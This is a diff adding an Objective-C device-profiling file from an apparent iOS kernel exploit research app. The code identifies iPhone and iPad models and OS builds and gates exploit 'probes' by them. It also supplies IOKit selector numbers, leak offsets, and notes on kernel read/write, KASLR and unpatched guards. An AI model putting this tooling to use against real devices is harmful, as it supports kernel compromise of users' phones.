@@ -1,0 +1,280 @@
+//
+//  LabDeviceProfile.m
+//  Lum1na
+//
+
+#import "LabDeviceProfile.h"
+#import "LabRuntimeOffsets.h"
+#import "LabLocalTime.h"
+#import <sys/utsname.h>
+#import <sys/sysctl.h>
+#import <stdlib.h>
+#import <string.h>
+
+static NSString *lp_sysctl(const char *name) {
+    size_t n = 0;
+    if (sysctlbyname(name, NULL, &n, NULL, 0) != 0 || n == 0) return @"?";
+    char *b = calloc(1, n + 1);
+    if (!b) return @"?";
+    sysctlbyname(name, b, &n, NULL, 0);
+    NSString *s = [NSString stringWithUTF8String:b];
+    free(b);
+    return s ?: @"?";
+}
+
+LabSku LabDeviceProfile_sku(void) {
+    return [LabDeviceProfile detectedSku];
+}
+
+const char *LabDeviceProfile_sku_string(LabSku sku) {
+    switch (sku) {
+        case LabSkuA12X_23G71: return "A12X_23G71";
+        case LabSkuA12X_other: return "A12X_other";
+        case LabSkuXR_22H311:  return "XR_22H311";
+        case LabSkuA13_22G100:    return "A13_22G100";
+        case LabSkuA13_other:  return "A13_other";
+        case LabSkuA14_23F77:  return "A14_23F77";
+        case LabSkuA14_21D50:  return "A14_21D50";
+        case LabSkuA14_other:  return "A14_other";
+        default:               return "Unknown";
+    }
+}
+
+@implementation LabDeviceProfile
+
+#pragma mark - Core Detection
+
++ (NSString *)machine {
+    return lp_sysctl("hw.machine");
+}
+
++ (NSString *)osversion {
+    return lp_sysctl("kern.osversion");
+}
+
++ (NSString *)skuString {
+    LabSku sku = [self detectedSku];
+    switch (sku) {
+        case LabSkuA14_23F77: return @"A14_23F77";
+        case LabSkuA14_21D50: return @"A14_21D50";
+        case LabSkuA14_other: return @"A14_other";
+        case LabSkuA12X_23G71: return @"A12X_23G71";
+        case LabSkuA12X_other: return @"A12X_other";
+        case LabSkuXR_22H311: return @"XR_22H311";
+        case LabSkuA13_22G100: return @"A13_22G100";
+        case LabSkuA13_other: return @"A13_other";
+        default: return @"Unknown";
+    }
+}
+
++ (LabSku)detectedSku {
+    NSString *m = [self machine];
+    NSString *v = [self osversion];
+    BOOL a14 = [m hasPrefix:@"iPhone13,"];
+    BOOL a12x = [m hasPrefix:@"iPad8,"];
+    BOOL xr = [m hasPrefix:@"iPhone11,8"] || [m hasPrefix:@"iPhone11,2"]
+           || [m hasPrefix:@"iPhone11,4"] || [m hasPrefix:@"iPhone11,6"];
+    BOOL a13 = [m hasPrefix:@"iPhone12,"];
+    if (a14 && [v isEqualToString:@"23F77"]) return LabSkuA14_23F77;
+    if (a14 && [v hasPrefix:@"21D"]) return LabSkuA14_21D50; /* 17.3.x — 12 mini */
+    if (a14) return LabSkuA14_other;
+    if (a12x && [v isEqualToString:@"23G71"]) return LabSkuA12X_23G71;
+    if (a12x) return LabSkuA12X_other;
+    if (xr) return LabSkuXR_22H311;
+    if (a13 && [v isEqualToString:@"22G100"]) return LabSkuA13_22G100;
+    if (a13) return LabSkuA13_other;
+    return LabSkuUnknown;
+}
+
++ (LabSku)sku {
+    return [self detectedSku];
+}
+
++ (NSString *)skuName {
+    switch ([self detectedSku]) {
+        case LabSkuA14_23F77:  return @"iPhone13,* A14 / 23F77";
+        case LabSkuA14_21D50:  return @"iPhone13,* A14 / 21D* (17.3.x) — 12 mini, Dopamine rootless";
+        case LabSkuA14_other:  return @"iPhone13,* A14 / not 23F77 or 21D*";
+        case LabSkuA12X_23G71: return @"iPad8,* A12X / 23G71";
+        case LabSkuA12X_other: return @"iPad8,* A12X / not 23G71";
+        case LabSkuXR_22H311:  return @"XR A12 / 18.7.x — momentarius-ready";
+        case LabSkuA13_22G100:    return @"iPhone12,* A13 / 22x build — reference rig";
+        case LabSkuA13_other:  return @"iPhone12,* A13 / not 18.x";
+        default:               return @"unknown";
+    }
+}
+
++ (BOOL)isTargetSku {
+    return [self detectedSku] == LabSkuA14_23F77;
+}
+
++ (BOOL)isA14_23F77 {
+    return [self detectedSku] == LabSkuA14_23F77;
+}
+
+- (BOOL)isA14_23F77 {
+    return [LabDeviceProfile detectedSku] == LabSkuA14_23F77;
+}
+
++ (NSString *)kernelVersion {
+    struct utsname u;
+    uname(&u);
+    return [NSString stringWithFormat:@"%s", u.release];
+}
+
+#pragma mark - Patch Oracle Utilities
+
++ (NSString *)stopUnlessA14_23F77:(NSString *)probe {
+    /* P007 convention: non-nil means STOP. Probes do `if (stop) return stop`.
+       Only unknown machines are blocked; SKU table still follows LabOff().
+
+       LAB_DEBUG_APP builds (Lum1na-Debug lab app) return nil — primitives run
+       on UNKNOWN machines. That is the point of the debug app: probe a new
+       device/OS, see what sticks. Honest cost: kernel-VA probes still HOLD
+       when LabOff() has no row for the SKU, and any unknown-SKU kernel write
+       is a guess — AutoLearn (p100) exists to produce the learning packet
+       that becomes a new table row instead of guessing. */
+#if defined(LAB_DEBUG_APP) && LAB_DEBUG_APP
+    return nil;
+#else
+    if ([self detectedSku] == LabSkuUnknown) {
+        return [NSString stringWithFormat:@"STOP %@ — unknown machine.\n%@\n",
+                probe ?: @"probe", [self identBlock]];
+    }
+    return nil;
+#endif
+}
+
++ (NSString *)gateMode {
+    /* What the SKU gate will do on this build — AutoLearn/IDENT print it. */
+#if defined(LAB_DEBUG_APP) && LAB_DEBUG_APP
+    return @"DISABLED (LAB_DEBUG_APP) — primitives run on unknown machines";
+#else
+    return @"active (unknown machines STOP)";
+#endif
+}
+
++ (BOOL)isExactOraclePair {
+    LabSku s = [self detectedSku];
+    return s == LabSkuA14_23F77 || s == LabSkuA12X_23G71;
+}
+
++ (uint32_t)queueCreateSel {
+    const LabOffTab *o = LabOff();
+    return o ? o->queue_create_sel : 6u;
+}
++ (uint32_t)queueDestroySel {
+    const LabOffTab *o = LabOff();
+    return o ? o->queue_destroy_sel : 7u;
+}
++ (uint32_t)queueSubmitSel {
+    const LabOffTab *o = LabOff();
+    return o ? o->submit_sel : 25u;
+}
++ (uint32_t)queueCreateSize {
+    const LabOffTab *o = LabOff();
+    return o ? o->queue_create_size : 0x410u;
+}
++ (uint32_t)queueLeakOff {
+    const LabOffTab *o = LabOff();
+    return o ? o->queue_leak : 0x558u;
+}
++ (uint32_t)sysmemMdOff {
+    const LabOffTab *o = LabOff();
+    return o ? (uint32_t)o->sysmem_md : 0x90u;
+}
++ (uint32_t)sel36 {
+    const LabOffTab *o = LabOff();
+    return o ? o->sel36 : 36u;
+}
++ (NSArray<NSNumber *> *)queueCreateSizeSweep {
+    uint32_t sz = [self queueCreateSize];
+    return @[ @(sz), @(0x408u), @(0x410u) ];
+}
+
++ (NSString *)expectQueueCreate {
+    return [NSString stringWithFormat:@"QueueCreate sel=%u size=0x%x leak=+0x%x",
+            [self queueCreateSel], [self queueCreateSize], [self queueLeakOff]];
+}
++ (NSString *)expectP010LastRef { return @"P010 last-ref: word1 small int; K-"; }
++ (NSString *)expectNecpReach { return @"NECP SO_NECP=0x1109 TLV=7; 84561/84507 map"; }
++ (NSString *)expectAVEOpen { return @"AVE Open; 84607 Close/async lock gap"; }
++ (NSString *)expect64788 { return @"64788 getter +0x90 naked; cd8 not KRW"; }
++ (NSString *)oracleTable { return @"oracle: LEFT=runtime sku; do not paste iPad VAs\n"; }
++ (NSString *)proveMatrix {
+    return @"prove matrix 23F77:\n"
+           @"  hasKread=NO until commitSlide kread32(kbase)==MH_MAGIC_64\n"
+           @"  LIVE: P057 65343 KASLR sel0/1; P044 v28 occupancy+conversion bar; KREAD commitSlide test; 64788 Facet A P065 0x2be oracle; P062 NEON; P063 aio84530 HEAP; P064 HT149041 map; P066 EncType MAP; P067 AVD reach; P068 chroot MAP; P069 dma MAP; P070 five-door census; P071 65408 DeviceOpen; P072 file-parser census\n"
+           @"  ANE lab (p080-p083): y = fp16_quantize(exact_sum + x126) ties round up; kernel sids 1..24 fetch-resolve; espresso staging NOT the value source (u16@0 rewrite is the observable)\n"
+           @"  HT149041 leftovers MAP: 84507/84561 P053, 43684 P069/P055, 28968 P054, 84607 P066/P039 PARK remaining-fire, 84523 P045 census CLOSED remaining-fire, 43743 DoS, 65408 P071, 65407 P067, 43689 P068\n"
+           @"  CLOSED: 84523 sandbox (P057/P051/P052); P045 recv; LightSword last-wire GPU OOM; type-3 PACGA\n"
+           @"  PARKED: 28968 reap fire; 163-sel; 0x800; hop-1; AfterKread persist; 86950 CG; file-ACE payloads (P072 is census)\n"
+           @"  NOTE: Lum1na catalog p064 = AVE racer. HT149041 print map id = ht149041. P007 p064 = that map.\n";
+}
++ (NSString *)slideDestMap { return @"43724 pager dest unnamed; #536=22\n"; }
++ (NSString *)writeClassMap { return @"W not found this factory. F≠W. 84607 AVE race class.\n"; }
+
++ (NSString *)identBlock {
+    const LabOffTab *off = LabOff();
+    NSMutableString *out = [NSMutableString string];
+    struct utsname u;
+    uname(&u);
+    [out appendFormat:@"=== IDENT %@ ===\n", LabLocalMilitaryNow()];
+    [out appendFormat:@"machine        %@\n", [self machine]];
+    [out appendFormat:@"osversion      %@\n", [self osversion]];
+    [out appendFormat:@"release        %s\n", u.release];
+    [out appendFormat:@"sku            %@\n", [self skuName]];
+    [out appendFormat:@"offset table   %s\n", off ? off->tag : "NULL"];
+    [out appendFormat:@"QueueCreate    sel=%u size=0x%x leak=+0x%x destroy=%u submit=%u MD+0x%x sel36=%u\n",
+         [self queueCreateSel], [self queueCreateSize], [self queueLeakOff],
+         [self queueDestroySel], [self queueSubmitSel], [self sysmemMdOff], [self sel36]];
+    switch ([self detectedSku]) {
+        case LabSkuA14_23F77:
+            [out appendString:@"TRACK: iPhone13 A14 23F77 ACTIVE. Dual-oracle LEFT.\n"];
+            break;
+        case LabSkuA14_other:
+            [out appendFormat:@"TRACK: A14 osversion=%@ NOT 23F77.\n", [self osversion]];
+            break;
+        case LabSkuA12X_23G71:
+            [out appendString:@"TRACK: iPad A12X 23G71. Do not paste T8020 VAs into A14.\n"];
+            break;
+        case LabSkuA12X_other:
+            [out appendFormat:@"TRACK: iPad A12X osversion=%@.\n", [self osversion]];
+            break;
+        case LabSkuXR_22H311:
+            [out appendString:@"TRACK: XR A12 18.7.x — momentarius-ready (ladder row).\n"];
+            break;
+        default:
+            [out appendString:@"TRACK: unknown — paste Ident before panic tests.\n"];
+            break;
+    }
+    [out appendString:@"Runtime profile always wins.\n"];
+    return out;
+}
+
++ (NSString *)patchOracleMap {
+    NSMutableString *map = [NSMutableString string];
+    [map appendString:@"=== Patch Oracle Map ===\n"];
+    [map appendFormat:@"Machine: %@\n", [self machine]];
+    [map appendFormat:@"osversion: %@\n", [self osversion]];
+    [map appendFormat:@"SKU: %@\n", [self skuString]];
+    [map appendFormat:@"Target: %@\n", [self isTargetSku] ? @"YES" : @"NO"];
+    [map appendFormat:@"Kernel: %@\n", [self kernelVersion]];
+    // P007 lab oracle text (26.7 HT149041 guard map vs 23F77).
+    [map appendString:@"26.7 HT149041 guards ABSENT on 23F77: EncType mismatch, "
+     "necp underflow, upl_validation, reap free-entry, chroot entitlement, "
+     "bpf attach policy. aio_workq_entry live @ 0xa285e94. See P064.\n"];
+    return map;
+}
+
+#pragma mark - P009 Support
+
++ (NSString *)banner {
+    return [NSString stringWithFormat:@"=== %@ ===", [self identBlock]];
+}
+
++ (NSString *)expectP009PathB {
+    return @"P009 PathB REPLACE_OK F (stale GPU) not W";
+}
+
+@end
